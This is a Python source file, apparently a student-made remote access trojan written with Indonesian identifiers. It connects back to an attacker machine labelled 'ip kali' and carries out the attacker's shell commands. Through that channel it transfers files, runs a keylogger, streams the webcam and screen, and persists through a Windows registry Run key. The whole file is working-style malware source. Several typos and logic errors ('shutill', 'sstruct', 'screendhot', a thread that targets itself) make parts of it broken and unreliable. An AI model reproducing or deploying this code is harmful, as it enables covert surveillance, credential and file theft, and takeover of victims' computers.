import sys
import time
import socket
import json
import subprocess
from subprocess import PIPE
import os
from logger import keylogger
import threading
import cv2
import pickle
import struct
import pyautogui
import pygame
from PIL import ImageGrab
import numpy as np
import shutill

sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sc.connect(('ip kali', 9999))

def menerima_perintah():
    data = ''
    while True:
        try:
            data = data + sc.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(namafile):
    file = open(namafile, 'rb')
    sc.send(file.read())
    file.close()
    file = open(namafile)

def download_file(namafile):
    file =open(namafile, 'wb')
    sc.settimeout(1)
    _file = sc.recv(1024)
    while _file:
        _file.write(_file)
        try:
            _file = sc.recv(1024)
        except socket.timeout as e:
            break
    sc.timeout(None)
    file.close()

def open_log():
    sc.send(keylogger().read_log().encode())

def log_thread():
    t = threading.Thread(target=open_log)
    t.start()

def byte_stream():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('ip kali', 9998))
    vid = cv2.VideoCapture(0)
    while (vid.isOpened()):
        img, frame = vid.read()
        b = pickle.dumps(frame)
        message = struct.pack("Q", len(b))+b  #Q adalah format untuk int yang ukurannya 8 byte. 4 byte = i
        sock.sendall(message)

def kirim_byte_stream():
    t = threading.Thread(target=kirim_byte_stream)
    t.start()

def byte_stream_recorder():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('ip kali', 9997))

    screen = pygame.display.set_mode((0,0), pygame.FULLSCREEN)
    screen = screen.get_size()
    WIDTH = screen[0]/2
    HEIGHT = screen[1]

    while True:
        img = ImageGrab.grab(bbox=(0, 0,WIDTH, HEIGHT))
        capture = np.array(img)
        capture = cv2.cvtColor(capture, cv2.COLOR_RGB2RGB)
        b = pickle.dumps(capture)
        message = sstruct.pack("i", len(b))+b
        sock.sendall(message)
        

def kirim_byte_stream_recorder():
    t = threading.Thread(target=byte_stream_recorder)
    t.start()

def jalankan_persistence(nama_registry, file_executable):
    file_path = os.environ['appdata']+'\\'+file_executable
    try:
        if not os.path.exists(file_path):
            shutill.copyfile(sys.executable, file_path)
            subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ' + nama_registry + ' /t REG_SZ /d "' + file_path +'"', shell=True) #t= type
        else:
            pass
    except:
        pass

def jalankan_perintah():
    while True:
        perintah = menerima_perintah()
        if perintah in ('exit', 'quit'):
            break
        elif perintah in 'clear': 
            pass
        elif perintah[:3] == 'cd ':
            os.chdir(perintah[3:])
        elif perintah[:8] == 'download':
            upload_file(perintah[9:])
        elif perintah[:6] == 'upload':
            download_file(perintah[7:])
        elif perintah == 'start_logger':
            keylogger().start_logger()
        elif perintah == 'baca_data':
            log_thread
        elif perintah == 'stop_logger':
            keylogger().stop_listener()
        elif perintah == 'start_cam':
            kirim_byte_stream()
        elif perintah == 'screen_shot':
            ss = pyautogui.screendhot()
            ss.save('ss.png')
            upload_file('ss.png')
        elif perintah == "screen_share":
            kirim_byte_stream_recorder
        elif perintah[:11] == 'persistance':
            nama_registry, file_executable = perintah[12:].split(' ')
            jalankan_persistence(nama_registry, file_executable)
        else: 
            execute = subprocess.Popen(
                                perintah,
                                shell = True,
                                stdout = PIPE,
                                stderr = PIPE,
                                stdin = PIPE
        )
        data = execute.stdout.read() + execute.stderr.read()
        data = data.decode()
        output = json.dumps(data)
        sc.send(output.encode())
# jalankan_perintah()
def run_persistance():
    while True:
        try:
            time.sleep(10)
            sc.connect(('ip kali', 9999))
            jalankan_perintah()
            sc.close()
            break
        except:
            run_persistance()

run_persistance()